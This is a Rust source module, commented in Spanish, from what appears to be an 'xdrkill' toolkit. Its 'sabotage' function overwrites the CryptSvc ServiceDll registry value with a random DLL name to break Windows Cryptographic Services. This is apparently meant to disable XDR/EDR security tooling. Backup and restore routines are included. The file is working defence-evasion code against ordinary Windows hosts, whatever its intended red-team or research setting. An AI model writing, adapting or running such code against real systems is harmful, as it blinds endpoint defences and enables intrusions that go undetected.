//! reg — manipulación del valor ServiceDll de CryptSvc (técnica central del
//! toolkit). Backup obligatorio antes de cualquier escritura.
#![allow(dead_code)]

use crate::sys;

const KEY: &str = r"SYSTEM\CurrentControlSet\Services\CryptSvc\Parameters";
const VALUE: &str = "ServiceDll";
const BACKUP_NAME: &str = "cryptsvc.bak";

use windows_sys::Win32::Foundation::{ERROR_FILE_NOT_FOUND, ERROR_SUCCESS};
use windows_sys::Win32::System::Registry::{
    RegCloseKey, RegDeleteValueW, RegOpenKeyExW, RegQueryValueExW, RegSetValueExW,
    HKEY_LOCAL_MACHINE, KEY_READ, KEY_SET_VALUE, KEY_WOW64_64KEY, REG_EXPAND_SZ,
};

/// Lee (tipo, datos) del valor `ServiceDll`. `Ok(None)` si no existe el valor;
/// `Err(rc)` si falla abrir la clave o la consulta.
pub fn read() -> Result<Option<(u32, Vec<u8>)>, u32> {
    let key_w = sys::wide(KEY);
    let val_w = sys::wide(VALUE);
    let mut hkey: windows_sys::Win32::System::Registry::HKEY = std::ptr::null_mut();

    // SAFETY: key_w es UTF-16 NUL-terminado; hkey es out-param válido.
    let rc = unsafe {
        RegOpenKeyExW(
            HKEY_LOCAL_MACHINE,
            key_w.as_ptr(),
            0,
            KEY_READ | KEY_WOW64_64KEY,
            &mut hkey,
        )
    };
    if rc != ERROR_SUCCESS {
        return Err(rc);
    }

    let mut ty: u32 = 0;
    let mut len: u32 = 0;
    // SAFETY: hkey abierto; val_w UTF-16 NUL; buffers locales válidos.
    let rc = unsafe {
        RegQueryValueExW(
            hkey,
            val_w.as_ptr(),
            std::ptr::null_mut(),
            &mut ty,
            std::ptr::null_mut(),
            &mut len,
        )
    };
    if rc == ERROR_FILE_NOT_FOUND {
        // SAFETY: hkey abierto; cerrar siempre.
        let _ = unsafe { RegCloseKey(hkey) };
        return Ok(None);
    }
    if rc != ERROR_SUCCESS {
        let _ = unsafe { RegCloseKey(hkey) };
        return Err(rc);
    }

    // +4 de holgura por si el valor crece entre las dos llamadas.
    let mut buf = vec![0u8; (len as usize) + 4];
    let mut len2: u32 = buf.len() as u32;
    // SAFETY: buf tiene capacidad len+4; len2 cabe en u32.
    let rc = unsafe {
        RegQueryValueExW(
            hkey,
            val_w.as_ptr(),
            std::ptr::null_mut(),
            &mut ty,
            buf.as_mut_ptr(),
            &mut len2,
        )
    };
    let _ = unsafe { RegCloseKey(hkey) };
    if rc != ERROR_SUCCESS {
        return Err(rc);
    }
    buf.truncate(len2 as usize);
    Ok(Some((ty, buf)))
}

/// Escribe `name` en `ServiceDll` como REG_EXPAND_SZ, incluyendo NUL final.
pub fn set_value(name: &str) -> Result<(), u32> {
    let key_w = sys::wide(KEY);
    let val_w = sys::wide(VALUE);
    let data_w = sys::wide(name); // incluye NUL
    // cbdata en bytes, no en caracteres.
    let cbdata: u32 = match u32::try_from(data_w.len() * 2) {
        Ok(v) => v,
        Err(_) => return Err(0),
    };
    let mut hkey: windows_sys::Win32::System::Registry::HKEY = std::ptr::null_mut();

    // SAFETY: key_w UTF-16 NUL; hkey out-param.
    let rc = unsafe {
        RegOpenKeyExW(
            HKEY_LOCAL_MACHINE,
            key_w.as_ptr(),
            0,
            KEY_SET_VALUE | KEY_WOW64_64KEY,
            &mut hkey,
        )
    };
    if rc != ERROR_SUCCESS {
        return Err(rc);
    }
    // SAFETY: hkey abierto; data_w es buffer UTF-16; cbdata = bytes.
    let rc = unsafe {
        RegSetValueExW(
            hkey,
            val_w.as_ptr(),
            0,
            REG_EXPAND_SZ,
            data_w.as_ptr() as *const u8,
            cbdata,
        )
    };
    let _ = unsafe { RegCloseKey(hkey) };
    if rc != ERROR_SUCCESS {
        return Err(rc);
    }
    Ok(())
}

/// Borra el valor `ServiceDll`.
pub fn delete_value() -> Result<(), u32> {
    let key_w = sys::wide(KEY);
    let val_w = sys::wide(VALUE);
    let mut hkey: windows_sys::Win32::System::Registry::HKEY = std::ptr::null_mut();

    // SAFETY: key_w UTF-16 NUL; hkey out-param.
    let rc = unsafe {
        RegOpenKeyExW(
            HKEY_LOCAL_MACHINE,
            key_w.as_ptr(),
            0,
            KEY_SET_VALUE | KEY_WOW64_64KEY,
            &mut hkey,
        )
    };
    if rc != ERROR_SUCCESS {
        return Err(rc);
    }
    // SAFETY: hkey abierto; val_w UTF-16 NUL.
    let rc = unsafe { RegDeleteValueW(hkey, val_w.as_ptr()) };
    let _ = unsafe { RegCloseKey(hkey) };
    if rc != ERROR_SUCCESS {
        return Err(rc);
    }
    Ok(())
}

/// Guarda `(ty, data)` en `sys::data_dir()/cryptsvc.bak` como texto
/// `type=<n>\ndata=<hex>\n`. Crea el directorio si falta.
pub fn save_backup(ty: u32, data: &[u8]) -> std::io::Result<std::path::PathBuf> {
    let dir = sys::data_dir();
    std::fs::create_dir_all(&dir)?;
    let path = dir.join(BACKUP_NAME);
    let content = format!("type={ty}\ndata={}\n", sys::to_hex(data));
    std::fs::write(&path, content.as_bytes())?;
    Ok(path)
}

/// Carga `(ty, data)` del backup. `None` si no existe o está corrupto.
pub fn load_backup() -> Option<(u32, Vec<u8>)> {
    let path = sys::data_dir().join(BACKUP_NAME);
    let content = std::fs::read_to_string(&path).ok()?;
    let mut ty: Option<u32> = None;
    let mut data: Option<Vec<u8>> = None;
    for line in content.lines() {
        if let Some(v) = line.strip_prefix("type=") {
            ty = Some(v.trim().parse().ok()?);
        } else if let Some(v) = line.strip_prefix("data=") {
            data = sys::from_hex(v.trim());
        }
    }
    Some((ty?, data?))
}

/// Sustituye `ServiceDll` por un nombre aleatorio (o `explicit`), guardando
/// backup del valor original si existe y no había backup previo.
pub fn sabotage(explicit: Option<&str>) -> Result<String, String> {
    let current = read().map_err(|e| format!("lectura fallida (código {e})"))?;

    match current {
        Some((ty, data)) => {
            let value_str = sys::from_wide(&data);
            crate::ui::info(&format!("ServiceDll actual: {value_str} (tipo {ty})"));
            if value_str.contains("xdrkill_") {
                crate::ui::warn("ServiceDll ya contiene xdrkill_ (posible sabotaje previo)");
                if load_backup().is_none() {
                    match save_backup(ty, &data) {
                        Ok(p) => crate::ui::ok(&format!("backup guardado en {}", p.display())),
                        Err(e) => return Err(format!("backup fallido: {e}")),
                    }
                } else {
                    crate::ui::info("backup previo intacto");
                }
            } else {
                match save_backup(ty, &data) {
                    Ok(p) => crate::ui::ok(&format!("backup guardado en {}", p.display())),
                    Err(e) => return Err(format!("backup fallido: {e}")),
                }
            }
        }
        None => {
            crate::ui::warn("ServiceDll no existe; se creará sin backup");
        }
    }

    let name = match explicit {
        Some(s) if !s.is_empty() => s.to_string(),
        _ => sys::random_dll_name(),
    };

    set_value(&name).map_err(|e| format!("escritura fallida (código {e})"))?;
    Ok(name)
}

/// Restaura el valor original desde el backup. Sin backup, elimina el valor si
/// existe.
pub fn restore() -> Result<Option<String>, String> {
    if let Some((ty, data)) = load_backup() {
        let val = sys::from_wide(&data);
        let key_w = sys::wide(KEY);
        let val_w = sys::wide(VALUE);
        let mut hkey: windows_sys::Win32::System::Registry::HKEY = std::ptr::null_mut();

        // SAFETY: key_w UTF-16 NUL; hkey out-param.
        let rc = unsafe {
            RegOpenKeyExW(
                HKEY_LOCAL_MACHINE,
                key_w.as_ptr(),
                0,
                KEY_SET_VALUE | KEY_WOW64_64KEY,
                &mut hkey,
            )
        };
        if rc != ERROR_SUCCESS {
            return Err(format!("abrir clave fallido (código {rc})"));
        }
        let cbdata: u32 = match u32::try_from(data.len()) {
            Ok(v) => v,
            Err(_) => {
                let _ = unsafe { RegCloseKey(hkey) };
                return Err("backup demasiado grande".to_string());
            }
        };
        // SAFETY: hkey abierto; data buffer válido; cbdata = bytes; ty del backup.
        let rc = unsafe {
            RegSetValueExW(hkey, val_w.as_ptr(), 0, ty, data.as_ptr(), cbdata)
        };
        let _ = unsafe { RegCloseKey(hkey) };
        if rc != ERROR_SUCCESS {
            return Err(format!("escritura fallida (código {rc})"));
        }

        let path = sys::data_dir().join(BACKUP_NAME);
        if let Err(e) = std::fs::remove_file(&path) {
            crate::ui::warn(&format!("no se pudo borrar backup {}: {e}", path.display()));
        }
        return Ok(Some(val));
    }

    match read() {
        Ok(Some(_)) => {
            crate::ui::warn("ServiceDll existe pero no hay backup; se eliminará");
            delete_value().map_err(|e| format!("borrado fallido (código {e})"))?;
            Ok(None)
        }
        Ok(None) => {
            crate::ui::info("ServiceDll no existe y no hay backup; nada que restaurar");
            Ok(None)
        }
        Err(e) => Err(format!("lectura fallida (código {e})")),
    }
}
